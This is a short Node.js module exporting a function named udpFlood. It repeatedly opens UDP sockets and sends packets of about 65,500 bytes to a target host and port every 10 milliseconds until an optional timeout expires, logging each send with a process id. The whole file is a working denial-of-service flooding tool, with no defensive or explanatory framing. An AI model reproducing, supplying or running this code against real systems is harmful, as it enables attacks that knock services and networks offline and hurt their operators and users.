let dgram = require('dgram');

function udpFlood(ips, port, timeout, pid) {
    let HOST = ips;

    let output = "";
    for (let i = 65500; i >= 0; i--) {
        output += "X";
    }
    let startTime = new Date();
    const intervalObj = setInterval(() => {
        if (timeout) {
            let nowTime = new Date();
            if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
                console.log('Timeout Reached for pid: ' + pid);
                clearInterval(intervalObj);
                process.exit(0)
            }
        }
        // const randomPort = Math.floor(Math.random() * (65535) + 1);
        let socket = dgram.createSocket('udp4');
        let message = Buffer.from(output);

        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
            if (err) throw err;
            console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
        });

        // socket.on('message', (msg, rinfo) => {
        //     console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
        // });
    }, 10)
}

module.exports = udpFlood;